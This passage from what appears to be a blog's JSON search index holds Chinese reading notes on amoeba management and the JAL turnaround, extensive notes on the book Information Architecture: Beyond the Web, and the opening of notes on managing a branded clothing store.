阿米巴的划分的三个基本条件 能够明确收入和发生的费用 作为最小单位的阿米巴，必须是一个能够完整地进行交易的单位 在分割的时候必须注意公司整体的目标和方针能够得到贯彻执行 公司内部交易价格根据市场价格来决定 内部采购+经费+利润&#x3D;产品交付价格 Master Plan 是必达目标 Master Plan 是经营者和各个部门的负责人，以及每个阿米巴的领导者一起参与制定的年度总目标 PDCA Plan：预定，包括成员自身的想法 Do：执行，全体成员共同努力执行 Check：分析，制定对策，针对预定目标来分析实际结果 Action：对策，明确问题本身以及发生的原因 开会不仅仅是确认数字，也确认个人决心 为了参加这个会议，各个经理必须事先在各自的部门内部与各位经理和主任们确定上个月的收支状况、收支差异、原因分析、以及制定出改善对策； 经费预算不是花销的权限，而仅仅做为利润计算的参考；当利润完不成的时候，削减经费是势在必行的举措； 阿米巴组织运营的心得 每天阿米巴实时的收支状况会统计并展示出来；这样大概到月中的时候，阿米巴负责人即可估测目标是否能够完成，并及时采取措施进行改进调整； 增加利润的三个方法 提高销售额 减少费用 减少劳动时间 稻盛经营十二条 明确事业的目的与意义：确立正大光明、符合天理大义的崇高目标 设立具体目标：始终与员工共享既定目标 胸中怀有强烈的愿望：要怀有能够渗透到潜意识中的强烈而持久的愿望 付出不亚于任何人的努力：一步步踏实工作，付出不懈努力 销售最大化、经费最小化：利润无须强求，量入为出，利润将会随之而来 定价即经营：制定价格是领导的职责。价格应制定在顾客乐于接受，公司能盈利的交汇点上 经营取决于坚强的意志 燃烧的斗魂 临事有勇 不断从事创造性的工作：日复一日，年复一年，始终坚持改革改良，在创意上下功夫 以关怀之心，诚实处事：买卖是双向的，要使包括对方在内的所有人皆大欢喜 保持乐观向上的态度，抱着梦想和希望，以坦诚之心处世 六项精进 付出不亚于任何人的努力 要谦虚，不要骄傲 要每天反省 活着，就要感谢 积善行，思利他 不要有感性的烦恼 支持阿米巴经营的“经营哲学教育” 人生工作的结果&#x3D;思维方式热情能力 思维方式是负100到正100分，其他两项是0到100分 作为领导者应有的姿态 任务一：让部下幸福 任务二：让部下有目标、有干劲、有梦想 被称为日航复活原动力的阿米巴经营 不仅建框架也要铸灵魂 首先从改变员工的意识入手 运用京瓷版聚餐会提高日航凝聚力 着实实行再生计划 意识改变，现场就改变：改变从大脑的想法开始 一年削减800亿日元的成本：减少没有审核的采购的浪费 为了导入部门核算制度而进行的组织改革 设立单独为利润负责的新部门：只有如此才能让阿米巴得到执行，让部门掌控经营主动权 设定每一次航班的成本和各种服务的单价：目的是为了能够实时掌握经营动态，并及时调整 根据预约状况来选择最合理的机型：关键在于促进部门间的合作，围绕利润目标共同努力 飞行员也通过选择航线来降低成本：当成本控制意识渗入每个人的脑海，就会积少成多产生效果 让阿米巴经营发挥出本色的东日本大地震：当整个组织能够对市场需求快速反应的时候，就能确保每次航班都有利润 关联公司从本体依存中脱离：每一个子公司都需要独立核算，实现独立自主的经营；","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"管理","slug":"管理","permalink":"http://example.com/tags/%E7%AE%A1%E7%90%86/"}]},{"title":"信息架构-超越Web设计","slug":"信息架构-超越Web设计","date":"2017-03-09T13:50:00.000Z","updated":"2024-09-22T23:08:41.991Z","comments":true,"path":"2017/03/09/信息架构-超越Web设计/","permalink":"http://example.com/2017/03/09/%E4%BF%A1%E6%81%AF%E6%9E%B6%E6%9E%84-%E8%B6%85%E8%B6%8AWeb%E8%AE%BE%E8%AE%A1/","excerpt":"","text":"信息架构简介：IA是一种设计原则，关注的是让信息可查找和易于理解 信息架构要解决的问题 挑战：信息过载、访问信息的更多方式； 人们基于信息做出决策和行动，应着眼于更广阔的抽象大局 不同的场所，不同的信息体验方式，却仍能够保持内在的一致性； 语义结构保持一致，降低用户的学习成本； 信息架构优先于导航设计，导航只是展现信息架构思考的结果； 信息与承载的物理载体的分离，去介质化； 我们的产品和服务是由信息构成的场所 信息架构的定义 信息，设计结构、决定组织方式和制定标签，查找和管理 用户、情景、内容之三角关系 情景：所有的数字化项目都存在于特定的商业或者组织环境中，每个组织都有自己的目标、任务、策略、流程和程序，了解它们很重要； 内容：所有权，格式，结构，元数据，数量，动态性（增长和周转） 用户：关注人的情感 市场是可以有细分的，找到自己的目标群体，围绕他们设计产品和服务，提供价值，获得共赢，相辅相成； 为查找而设计 人不会无缘无故的搜寻信息，他们获得信息总是有某种缘由或者目的，找到它（5W方法）； 4种不同的信息需求 已知条目搜索 探索式搜索 无遗漏式研究 回顾搜索（记忆遗忘或稍后处理） 了解用户的主要信息需求和可能的信息搜寻行为，方法：搜索分析（日志文件），情景式调查 为理解而设计 创建可以被人类理解和使用的环境 场所感：由信息组成的场所，组织原则，结构和秩序，模块化和可扩展性（应对变化，借喻了建筑不同组成部分的比喻） 信息架构的设计必须面向场景 可考虑多种交互模式的组合来应对更加复杂和挑战性的场景 好的网站应该是通过进化而来的，刚开始以最核心的场景，最精简的方式出场，然后逐步迭代它； 信息架构的基本原理：组织系统、标签系统、导航系统、搜索系统 信息架构详解 信息架构的可视化 组织系统：以各种方式为我们展示信息（例如分组归类等） 导航系统：协助用户在内容中移动 搜索系统：让用户搜索内容 标签系统：使用对用户来说有意义的语言描述分类； 自顶向下的信息架构 自底向上的信息架构：从内容中提出建议； 一些浏览帮手 组织系统：将网站网站内容分组或分类的主要方式（例如：按主题、按用户、按任务等） 全站导航系统：在全站中的位置，可以去哪里 局部导航系统：在子站中的位置，可以去哪里 站点地图&#x2F;目录：支持主导航和次导航，提供一个简明总览和链接的入口 索引：辅助性导航，按字母排序的内容链接列表 指南：辅助性导航，针对特定主题提供特定的信息，以及链接到子主题 网站向导：辅助性导航，通过一系列步骤引导用户 情景导航：内嵌于内容中，提供更深度化的内容链接； 一些搜索帮手 根据不同的搜索情景（包括探索、已知、无遗漏、回顾），来设计不同的搜索功能，例如：视频网站对内容推荐和回顾的单独突出（单独页面来呈现） 搜索结果：单独的结果、显示多少结果、结果的分级、排序、归类； 内容和任务：用户的最终目标 标题：内容的标签 嵌入式链接：文本中的链接，指向相关联的内容 嵌入式元数据：可以作为元数据的信息，可以先提取以便可以被索引来支持另外维度的搜索 块：内容的逻辑单元，可大可小可嵌套 清单：一组成块信息，或者连向成块信息的链接，按组分类，以特定的顺序显示（例如按时间） 顺序式帮手：暗示用户在任务或流程中的位置的线索，以及完成任务余下的步骤 标识符：暗示用户在信息系统中的位置的线索（例如面包屑，筛选条件标签） 组织系统 我们对世界的理解在很大程度上取决于我们组织信息的能力 目标：设计让用户可以理解的组织和标签系统 挑战：模糊性、异质性 组织系统由组织方案和组织结构组成； 组织方案定义了内容条目之间的共同特性，而且会影响这些条目的逻辑分组； 组织结构定义了内容条目和群组之间的关系类型 组织方案 精确式：适用于已知条目的搜索 字母顺序方案 年代顺序方案 地理位置方案 模糊式：模糊是世界的常态，适用于浏览和联想式学习 主题组织方案：重要的是定义内容范围，也就是用户想在系统区域中找到的东西 任务导向方案：通常内嵌在主题方案中 特定受众方案：产品有两个或多个明确受众的情况下使用 隐喻驱动方案：需要非常小心，要成功，隐喻必须是用户熟悉的 混合方案： 反映出一个事实：组织和用户都以查找内容和完成重要任务作为最高优先级别的工作 只要各种方案在网页上不同的位置，它们就仍然有为用户建议一个心智模型的能力 组织结构 层级结构：自顶向下的方法 记住一些原则 层级类别之间是互斥的，但也不被它束缚住（如果一个条目是模糊的，多种理解的，那么可以大胆的让它跨界出现，以便用户可以找到它） 重要的是考虑层级系统在广度和深度上面的平衡（重点考虑人的视觉扫描能力和思维的认知局限）（相对广度，应更保守的考虑深度，人对尝试的耐心，相对于广度的扫描力，更低一些） 层级模式是设计的起点，但不要纠结于此，它更多是凝聚性组织系统的一个组成部分，某些内容区域需要采用数据库和超文本的做法更合适； 数据库模式：自底向上的方法 为了便于搜索和检索而设置的数据集合 自动产生按字母排序的索引 动态演示相关的“请参见”链接的内容 按字段搜索 高级过滤和搜索结果的排序 超文本 优点：灵活性高 缺点：依赖个人经验，容易迷失 适用场景： 不适用于主要的导航结构 适用于补充基于基层或者数据库模型的结构，在已建立的层级结构中建立条目和区域之间的创造性关系 社会化分类：自由式标签是简单又强大的工具，在某些情景下特种的适用，能够提供常规分类所无法产生的效果 创建凝聚式组织系统 大型系统通常需要几种结构类型 内容条目之间的弱结构化、强创造性关系，可以通过作者提供的超文本或者使用者贡献的标签来处理（例如：豆瓣、Facebook等）； 标签系统 标签的目标是有效传达信息； 标签应该教导用户理解新的概念，并协助他们快速识别出熟悉的概念； 标签类型 情景式标签： 依赖场景（上下文，解释性文字，明确的标题） 认真反思产品中使用到的每个标签是否具备足够的自解释性，如果没有，是否有说明性描述 回答：用户点击后期待看到什么东西？ 标题标签 层级关系可以通过视觉设计来传达； 如果内容具备足够的自解释性，则标题不一定是必须的； 导航标签 首页、主页、总页； 搜索、查找、浏览、搜索&#x2F;浏览 站点地图、内容、目录、索引 联系方式、联系我们 帮助、FAQ、常见问题解答 新闻、新闻&amp;事件、新闻&amp;声明、声明 关于、关于我们、关于（公司名称）、我们是谁 索引词标签 更精确的搜索 省略细节的同时仍能提供价值； 图标标签 节约了空间，增加了美感，也增加了不确定性； 会因为反复出现而在用户认知中建立模式 不要让形式凌驾于功能之上 标签的设计 通用原则 尽可能的缩小范围 锁定目标受众 专注主题领域（先模块化之后，再依据情景设计标签，嵌入到相应的模块中，这样更有针对性，而不用一开始上来就想覆盖所有） 开发一致的标签系统，而不是标签 风格：标点符号和大小写（此点在中文中不明显） 版面形式：字体、字号、颜色、间距、分组 语法：动词、名词 粒度：含义大致等同于其范围，不同粒度会引起很大的困惑 全面性：不存在明显的缺口，尽量反映出覆盖的内容（如果部分内容没有细分，或许可以使用类似“其他”的字样来涵盖全面性） 用户：如果用户使用不同的语言和术语，则有必要单独设计不同的标签系统，即使这些系统描述的是相同的内容 使用现有标签系统的来源 当前的信息环境 研究现有标签系统最大的好处在于它们是系统化的 建立标签表格，可以更完整、更集中、更精确的看待网站的导航系统，表格内容包括： 标签 目的地的标题标签 目的地的标签 类似网站和竞争对手的网站 受控词表和叙词表：taxonomywarehouse.com 创建新标签系统的来源 内容分析 内容作者 用户代言人和主题专家 用户（直接）：卡片分类法（开放式和封闭式）、自由列举（通过头脑风暴来寻找对条目的标签描述） 用户（间接）：搜索日志分析、Google AdWords 获取搜索词； 持续的优化和调整 标签代表的是内容和用户之间的有关系，而这种关系是经常变化的 导航系统 种类 嵌入式： 目标：提供情景和灵活性，帮助用户了解他们现在的位置，以及他们可以去哪里 分类 全局导航：时时可见 局部导航：虽然内容可以不同，但应使用统一的设计规范，保证视觉风格和用户理解的一致性 情景式导航 视觉惯例：在固定的位置出现 注意适度性：不要喧宾夺主 例子： 购物网站的同类商品推荐 作用：提供了交叉销售、提升销售转化率、打造品牌和提供顾客价值的机会 挑战：需要在用户移动的灵活性和提供过多选项的风险之间取得平衡 辅助式 站点地图 显示了信息层次的前几级，为用户提供了宽广的视野 如果网站本身架构不强，或许使用索引会更加合适 索引 相对扁平，适合那些已知条目的用户 站点地图则会鼓励用户探索，而索引会跳过层级结构，方便于已知条目的搜索 粒度问题是一个挑战：通过分析搜索日志和进行用户研究，以了解用户的需求来解决这个问题 单阶段索引：关键词与内容之间只需要一步 双阶段索引：从索引中选择术语，然后从以术语为索引的文档清单中进行选择 术语轮排和参照关系 指南 包括导游、教程、以及针对特定主题或任务的走查（比如初始化配置） 有营销作用，对外和对内（例子：Salesforce针对不同角色的功能导游） 原则 指南应该简短 无论何时都可以退出 来回移动的导航应该一致； 基于回答问题而设计 截图应该清晰和优化的，支持关键功能的放大效果 如果指南有多页，则应考虑有自己的目录 挑战：用户只用一次或者不用，因此它不是系统的重点，需要在投入的设计时间之间取得平衡 配置器 帮助用户配置产品的向导，可以让用户轻易完成复杂的决策或初始化过程 浏览器的导航： 浏览器有自己的导航机制，注意它的存在可能带来的影响 PC、手机、非浏览器等不同使用环境对导航设计的限制和支持 场所营造 通过语言创造场景感并提供探索网站的清晰路径，是导航系统的重要作用之一 确保你的设计提供情景线索 以清晰一致的方式展现尽可能多的信息层级结构 凡是使用图标的地方，都应该考虑加上工具提示； 使用语言的地方，是否添加工具提示，需要在地雷阵、用户预期、自解释性之间取得平衡 高级导航方法 个性化和自定义 个性化： 我们猜测用户想要什么，例如亚马逊的首页推荐 挑战：没有足够的信息基础，很难猜测 自定义： 用户告诉我们他想要什么 用户只在少数对他很重要的功能愿意投入时间去做自定义（具有重复访问用户的企业网站适合使用此模式） 可视化 当用户通过产品的外观在一系列结果中进行选择时，可视化是最有用的，例如购物 社会化导航 单个用户的价值可能来自对其他用户行为的观察 基于社交图谱 搜索系统 第一个思考的问题：产品是否需要搜索？ 要考虑内容的数量（需要投入的创建和维护搜索引擎时间之间取得平衡） 关注更有用的导航系统（如果搜索能够利用强大导航系统的各项优点，搜索会工作的更好）（全局导航貌似会将情况变得复杂起来） 优化搜索系统的时间和技术（搜索可以很容易启动并运行，但不一定能实现有效的效果，如果做不到，则重新考虑） 其他替代方案：比如索引，虽然一开始需要投入时间，但更容易维护 考虑用户首选的交互方式 什么时候会到达需要搜索系统的地步： 有太多的信息需要浏览 搜索可以帮助片段化的网站实现统一（例如公司存在多个子系统或子网站） 搜索是一种学习工具：可以获得搜索日志并进行分析来改进系统 搜索应该在那里，因为用户期待它在那里； 搜索可以驯服动态性：比如网站是新闻类的高度动态内容，通过手工索引整理内容太麻烦且不现实 搜索通常是迭代的：经常需要搜索几次后才得到想要的结果 不同搜索引擎有不同的优缺点，需要了解它们，才能结合场景和用户，选择最合适的搜索引擎，而不能仅由技术人员单方面决定（有哪几种搜索引擎？）； 如何选择可被搜索的内容 确定搜索区域： 优点：创建信息环境的子集，切割数量庞大的内容 缺点：很多用户在开始使用搜索时会忽略搜索区域，待思考如何以更明显的方式突出 切割方法 导航 vs 目标：通过导航实现区域化 为特定用户建立索引：不同角色登录，搜索不同内容 按主题索引：对搜索结果提供分类筛选 索引最近的内容：按时间分类 选择要建立索引的内容组件：并非页面上的组件都具有相同的重要性，只对重要的组件建立索引，减少无效信息的干扰 搜索算法：查全率与准确率，二者是逆相关的，选择哪个取决于用户场景 查询生成器：能够有效提高搜索性能，包括： 拼写检查工具 语音工具：smith 与 smyth 词干提取工具：lodge 与 lodging 自然语言处理工具： how to 和 how can i 受控词表和叙词表：同义语 显示结果 要显示哪些内容组件 已知条目搜索：显示较少的信息；探索型：提供较多的信息 考虑多种视图查看方式：列表、图片、地理位置 避免首页的搜索结果提供太多信息，导致后续页面的结果被淹没 注意思考用户搜索的目的，怎样才能以最短的路径让用户看到内容（搜索结果展现的重新排版）； 如果内容中没有太多结构，显示在“上下文”的中搜索词是一种变通的方法 要显示多少文档 文档内容多，小的结果集；文档内容少，多的结果集；同时还需要考虑屏幕分辨率、网速、浏览器设置等；简单化是最安全的（只显示少量的结果，用户可以根据自己的需求做进一步的选择） 建议让用户知道检索结果总数 结果集的二次过滤查询 搜索结果的显示，信息可以重新排版，内容丰富程度取决于用户的动机和对显示所有结果的影响 列出结果 排序：适用用户寻求做决策或采取行动 按字母排序 按年表排序 排名：适用用户需要理解信息或学习事物 按相关性排名：有多种算法，例如文档中有多少查询词，出现频率、出现位置多近、出现的位置、文档本身的受欢迎程序；对于不同的内容，不同的相关性算法各有其意义；文档异质性越高，越需要谨慎使用相关性算法（比如清单文档和内容文档）； 按受欢迎程度排名 按用户或者专家的评价排名 按位置付费排名 将结果分组：方便用户针对不同内容类型二次过滤查看 对结果采取行动 号召行动：购买、下载等 选择结果的子集：例如购物车 保存搜索：供下次使用 设计搜索界面 搜索框 自动完成和自动建议：可考虑用于取代高级搜索机制 高级搜索 支持修改：进一步的过滤和定位 在结果页中重复搜索 说明结果来自何处 说明用户做了什么 重述查询：文字描述型，标签型 描述所有合适的过滤器 显示其他当前设置，例如排序 提取检索到的搜索结果 整合搜索与浏览 左侧过滤器可以随着用户对搜索结果的深入进行变化，适用于探索型搜索 当用户被卡住时 修改搜索的方式 改进搜索的建议 改进浏览方式：导航、站点地图 建议和人联系 叙词表、受控词表和元数据 作用：后端的叙词表可以让前端的用户感受到更令人满意的无缝体验 元数据：关于数据本身的属性 由元数据来驱动内容的管理，而非人工逐条分类，建立规则，新条目自动分类 受控词表：同义词环形式的等价术语清单，或者是规范文档形式的首先术语清单； 同义词环：把一组定义为等价关系的词汇连接起来，以供检索使用（同一事物，不同的人会有不同的叫法） 规范文档： 首选术语或可接受值的清单；规范文档也是同义词环，只是它将术语定义成首选术语或可接受的值； 好处：提供信息交流对接的统一标准，例如跨系统的数据库整合 分类方案：用来表示首选术语的排列，例如：奈飞使用微类型给电影分类 叙词表：一种受控词表，包含等价关系、层级关系、关联关系，目的是改进检索 等价关系：同义词管理 层级关系：类别和子类别 关联关系：不会被层级或者等价关系处理的有意义的连接 技术术语： 首选术语、异形术语、上位类术语、下位类术语、相关术语 使用、用于、范围注释 叙词类型：经典叙词表、索引叙词表、搜索叙词表 语义关系 等价：创建丰富的入口词，连接用户与内容； 层级：最终目标是增强用户找到他们所需要东西的能力 属于：生物中的纲-种关系 整体-部分：手-手指 实例；海-地中海 关联：强烈暗示，强隐含语义关系，没有等价和层级关系 首选术语 术语形式 语法：优先名词 拼写：一致性 单数和复数：可数，复数；概念名词：单数 简写和缩写：最常见的写法 术语选择 文献保证原则：文档中出现的术语 用户保证原则：满足大多数用户的需求 术语定义：管理模糊性 括号式术语限定词：Cells(biology), Cells(electric) 范围注释 术语特异性：随着内容增长，使用复合术语的概率提高，以便取得准确性 多元层级 对于大型信息系统，多元层级结构不可避免； 带来的挑战是如何处理导航情景的表示，可考虑主要位置和次要位置的概念 分面分类法：通过多维度的描述来给事物分类 初创者的5维度：本体、物质、能量、空间、时间 商界常用6维度：主题、产品、文档类型、用户、地理位置、价格 好处：提供了强大的能力和灵活性（基于描述性元数据和结构） 完成信息架构 研究 研究框架： 用户：受众、任务、需求、信息搜寻行为、体验、词表 情景：商业目标、资金、政治、技术、人力资源 内容：文件&#x2F;数据类型，内容对象，元数据，数据量，现存结构 情景 获得支持 你是谁？为什么要问我这些问题？ 什么是信息框架？我为什么要在乎它？ 你的方法是什么？它如何与你的工作相联系？ 背景研究 短期和长期目标是什么？ 商业计划是什么？政治因素有哪些？ 日程安排和预算如何？ 目标受众是谁？ 用户为什么要访问这个网站？他们为什么会常来？ 用户可以执行哪些任务？ 如何建立和管理内容？谁来做？ 技术基础架构是什么？ 以前什么行得通？什么行不通？ 初步演示报告 信息架构是什么？它为什么这么重要？ 信息架构如何与网站的其他组成部分和组织本身关联？ 主要的里程碑和可交付成果是什么？ 研究会议 策略小组会议：设定高层目标、定义任务、愿景、受众、内容和功能；5-7人比较理想，避免人多产生的政治干扰 系统的目标是什么？ 目标受众是谁？ 规划的内容和功能是什么？ 人们会使用什么渠道来访问系统？ 谁会参与这项工作？ 什么时候需要展示成果？ 预期会有哪些障碍？ 内容管理会议 有关内容部分，正式和非正式的政策是什么？ 是否有处理创作和发布的内容管理系统（CMS）？ 这些内容是否使用受控词表和属性管理内容？ 内容由谁以及如何输入系统？ 采用了何种技术？ 每个拥有者处理什么内容？ 内容的目的是什么？建立该内容区域的目标的愿景是什么？ 受众是谁？ 用户如何访问系统？ 内容的格式是什么？它是动态的还是静态的？ 谁维护内容？ 未来的内容和服务规划是什么？ 内容来自何处？如何淘汰它？ 哪些法律问题会影响内容管理过程？ 信息技术会议 我们能利用内容管理软件吗？ 我们如何创建必要的基础架构来支持标签？ 内容管理系统可以处理文档的自动分类吗？ 自动索引生成怎么样？ 个性化怎么样？ 搜索引擎的灵活性如何？ 搜索引擎支持和叙词表的整合吗？ 我们如何定期获取搜索日志和使用分析？ 利益相关者访谈 访谈主要的领导和相关投资人通常是商业情景调查中最有价值的部分 访谈中，多问他们开放性的问题，包括对现有系统的评估，以及对未来的愿景 他们在政治上的长期支持，比在访谈中给的答案重要的多； 问题样本 你在组织中的角色是什么？你的团队做些什么？ 在理想世界中，你的公司如何利用企业内网建立竞争优势？ 在你看来，你的公司内部网络面临的关键挑战是什么？ 哪些企业范围的倡议应该是策略团队知道的？ 你会使用现有的企业内部网络吗？如果不，原因是什么？如果要使用，你要使用哪部分？使用频率如何？ 你如何访问企业内部网络？ 部门和员工分享知识的动机是什么？ 企业内部网络成功的关键因素是什么？ 这些因素如何被衡量？投资回报率是多少？ 重新设计企业内部网络时，最重要的3件事是什么？ 如果你要告诉企业内部网络策略团队一件事，会是什么？ 有什么问题是我们该问却没有问的？ 技术评估 内容：用户必须寻找到内容才能进行使用，可寻性优于可用性 启发式评估：一个或多个专家评审，用一组设计准则来测试网站 网站应该提供多种方式来访问相同信息； 应该采用索引和站点地图来弥补分类法的不足； 导航系统应该给用户情景意识； 网站应该使用一致且适合用户的语言； 搜索和浏览应该整合并彼此强化 内容分析：一种自底向上的方法，涉及仔细检查信息环境中现有的文档和对象； 内容的收集：格式，文档类型，来源，主题，现有架构 内容分析 内容分析的边际效应之一就是熟悉对组织和人很重要的主题 结构化元数据：对象的信息层级 描述性元数据：可以描述该对象的多种方式 管理型元数据：描述该对象如何与商业情景相关联 问题列表 这个对象是什么？ 我可以如何给人和机器描述该对象？ 这个对象和其他对象有何区别？ 我如何才能让这个对象被人和机器发现？ 内容地图：用可视化的方式将内容展示出来 标杆法 竞争式标杆法： 从竞争对手那里借用信息架构是有价值的，但必有很谨慎 优点 生成信息架构特色的详细清单，并将很多新想法摆上台面； 挑战嵌入到脑海中的假设，并避免由于错误的原因而复制错误的本色； 以竞争对手为基准建立当前位置，并创建衡量改进的参考点； 将一般性描述转化为具体可操作的定义 前后式标杆法： 投资回报率 重新设计平均可以减少多少用户查找文档的时间？ 重新设计是否提高了用户查找文档的能力？ 重新设计在哪些方面对用户效率或者效益产生了负面影响？ 优点 识别并优先处理现有信息架构中的特色； 创建一个可以衡量改进的参考点 将一般性描述转化为具体可操作的定义 用户 使用分析 内容性能：一段时间内对网站内容的访问次数和交互数； 访问信息：访客来源、IP位置、浏览器 点击流：移动路径，让其有价值的是用户的反馈，为何来，为何离开；可以考虑在离开时弹出问卷调查； 搜索日志分析 哪些热门查询搜索不到结果？ 是因为他们输错了关键词，还是网站本身没有相关内容？ 哪些热门查询可以查到上百条结果？ 找出几百条结果的这些用户真正想查找的是什么？ 哪些查询越来越受欢迎，哪些查询越来越不受欢迎； 客户支持数据：回答顾客或者员工问题的人，如人事、客服、前台等，他们是知道问题所在的人 参与者定义和招募 调查 宽而浅的研究工具，可以快速廉价的获取数据，无法搜集到用户信息搜集行为的详细数据 适合场景 用户认为哪些内容和任务是最有价值的； 用户对当前产品最失望的是什么； 用户有什么改进方案 用户当前的满意水平 情景调查：可以得到非常有价值信息的工具； 焦点小组 对网站内容和功能产生各种想法的好工具 测试网站可用性的非常差劲的工具 用户研究会议 访谈：放松的问题，由易到难的问题，结束的措词 卡片分类法：非常强大的工具 开放式 封闭式 用户测试：非常强大的工具 研究的保卫战：克服研究的阻力 策略 信息架构策略是构建和组织信息环境的高级概念性架构，策略通常会在策略报告中进行详细说明，常用策略建议： 信息架构管理：建立出一种用于开发和维护信息架构的实用策略 技术整合：思考可使用哪些技术工具 自顶向下或者自底向上的重要性 组织和标签系统（自顶向下） 文档类型识别（自底向上） 元数据字段定义 导航系统设计 策略的开发 思考：将研究的数据转化成创造性的理念 表述：图表、隐喻、故事、场景、蓝图、框架图（先用纸笔形成框架，初期远离绘图工具） 沟通：演示、互动、头脑风暴，向其他人声明这是草稿，欢迎批判和补充； 测试：封闭式卡片分类法、原型 工作产品和可交付成果 隐喻探索：在熟悉和不熟悉的事物间建立联系 组织型隐喻 功能型隐喻 视觉隐喻 场景 帮助其他人了解用户如何在你设计的网站中浏览和体验的最佳工具 谁在用你的网站，他们为什么用，怎么用，匆忙使用，还是想探索； 案例研究和故事：实现信息架构概念的好方法 概念图表 站点地图和框架图：将混乱变得有序 策略报告 执行摘要：提供目标和方法的纲要，以及主要问题和主要建议； 网站的受众、使命和愿景 经验教训：观察-结论-建议，通过标杆法、用户访谈和内容分析，显示提出的建议其来有自，以建立信心和信任； 架构策略和方法：展示成果，用图表和原型的方式 内容管理 规则：标准化、可重复的流程，帮助组织管理和运转其内容； 角色：管理内容的员工或其他人员； 资源：内容本身的各种不同形式； 模板：让相同类型的数据可以重用共享结构化的网页 元数据：元数据元素、范例 叙词表：为元数据建立叙词表，可以帮用户更容易找到信息 项目计划：可以和其他团队的计划整合，为整个网站的设计取得结构化的时间安排 我们该怎么做 需要多长时间 谁来做 需要哪些可交付成果 依赖关系是什么 演示：信息架构的可交付成果如果无人问津，就会死得很快，人们通常不喜欢读50页的策略报告，如果没有一些演示和讨论，最佳建议会永远不见天日； 设计和文档 创建信息架构图的准则 使用多张图表提供信息架构的不同维度的风貌（设计草图、站点地图、线框图、内容模型和清单等） 为特定受众和需求制定观点：针对不同角色使用不同的语言来描述 其他 尽可能亲自介绍 事先了解他们需要从中得到什么 最常用的是站点地图和线框图 视觉沟通 图表可用于沟通信息结构的两个基本方面 内容组件：内容单元由什么组成，以及它们如何分组和排序 内容组件之间的连接：组件之间如何连接才能支持对它们的操作 目标：传达你的网站内容组件是什么，以及它们是如何连接的 站点地图：可以显示出信息元素之间的关系（例如网页和它的内容组件），并可以用来描述组织、导航和标签系统； 高级站点地图 最有用的探索组织体系的工具 非常适合于内容的组织管理，和用户的访问路径讨论； 深入站点地图 避免拘泥于某种特定的布局，而应该让站点地图的形式适应功能； 网站不只是关注内容，还可以面向事务性和以任务为导向的场景 站点地图关注的是网站的主要区域和结构，并忽略导航元素和页面细节 原则：少即是多 保持站点地图的简单性 四个图例：网页、内容组件、链接、内容组群（相关、相似），颗粒度：内容组群&gt;网页&gt;内容组件 详细的站点地图 展示从主页到目的地之间的完整信息层次结构，详细说明每个区域的标签和导航系统 它能反映出整个网站，让生产小组可以在你不参与的情况下实施项目； 它仍由四个图例组成，只是给将图例实例化 组织你的站点地图 图表可能没有办法在一页纸上面打印，可以考虑通过模块化和唯一标识的ID来串联这些打印在单页纸张上面的模块 线框图 描述了从架构观点出发，单个网页或者模板应该是什么样子，它将产品的信息架构和交互设计结合了起来； 目标不是为系统的每个页面，而是为那些复杂而独特的网页建立线框图，或者是为了给其他网页建立一种复用的模式（如模板） 线框图可以帮助思考不同屏幕大小的影响 保真度 低保真度：重点在于内容和元素的布局，而不是内容的精确性 中保真度：引入内容、布局、导航，有更多详细的细节 高保真度：增加了颜色、字体、排版，即更多视觉设计的内容 线框图准则 一致性是关键：确保客户和同事易于理解和阅读； 使用模板来解决复用问题； 通过元件标注提供网页元素的更多细节 如果涉及多名成员开发，注意建立一套开发、维护共享的模板 内容映射和清单：将内容拆开或组成块，从而能够将它们引入到网站中（前面是自顶向下的设计，现在通过分析内容，实现自顶向下和内容自底同上二者的结合） 定义内容块 该内容是否应该分成用户想要分开访问的、更小的内容块？ 需要单独编制索引的最小内容是什么？ 该内容需要在多个文档中重复使用，或者是作为多个流程的一部分吗？ 通过为每个内容块指定一个唯一的识别码，可以记录所有内容的来源和目的地； 内容清单：描述可用内容和这些内容的位置，以及需要补充的空白； 内容模型：支持产品内部的情景式导航 将一组内容以一种有意义的逻辑关系进行组织，使得用户可以识别它的范式并快速理解信息； 支持情景式导航：根据上下文，猜测用户下一步可能去向哪里，提前将选项放在用户的面前，缩短用户的访问路径 处理大量内容：大量信息之间存在共通性，通过链接它们提高内容之间互相访问的可预测性；当引入自动化链接时，可以花很小的时间成本，有序有效的管理大量内容，从而获得巨大的收益； 可以通过卡片法来测试验证内容之间的链接关系：看一张卡片，询问想去哪里，找出下一张目的地卡片，建立连线（桌子+绳子，或者白板+白板笔画线）；以及可以询问哪些遗漏的对象可以放进来 依赖元数据做为连接内容块的基础：内容对象、链接的其他内容对象、可利用的常见元数据属性 制作内容模型的两个好处： 迫使确认哪些内容对内容模型而言是重要的； 迫使从众多元数据中选出可以让内容模型运行的元数据； 受控词表：用能够管理词汇的元数据矩阵和应用程序来传达 元数据矩阵：词汇（产品类型）、说明（3Com销售的产品类型）、范例（集线器、调制解调器）、维护难度（中等） 设计协作：不同角色的成员互相交流共同启发，做出更好更有价值的成果：可以使用设计草图和交互原型两种工具来辅助沟通和暴露问题； 信息架构风格指南 一份文档，用于说明网站使命和愿意，组织方式、这样组织的原因、其受众、以及架构如何随着系统扩展 目的： 随着外部环境的变化，内容的增加，确保让网站的维护走在正确的方向上，不会造成原有的组织、导航、标签和索引系统被破坏； 辅助判断新产生的变更是否需要纳入考虑，或者拒绝暂不考虑； 指南的具体组件 标准：维护和改变网站时，通常至少要遵循的某些规则； 指南：建议信息架构应该怎么维护（非强制） 维护程序：记录必备的日常维护任务 模式库：记录和获取产品设计的可重用方面；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}]},{"title":"品牌服装店精细化管理","slug":"品牌服装店精细化管理","date":"2017-02-15T02:14:00.000Z","updated":"2024-09-22T23:11:03.642Z","comments":true,"path":"2017/02/15/品牌服装店精细化管理/","permalink":"http://example.com/2017/02/15/%E5%93%81%E7%89%8C%E6%9C%8D%E8%A3%85%E5%BA%97%E7%B2%BE%E7%BB%86%E5%8C%96%E7%AE%A1%E7%90%86/","excerpt":"","text":"1. 思维模式 常见问题 大环境不好 人员不好招，不好留，员工能力差 货品管理不好，库存压力大 进货、人工、房租成本上涨，利润被不断压缩 品牌 提升点 货品 形象 服务 利润来源 差异性 价值性 唯一性 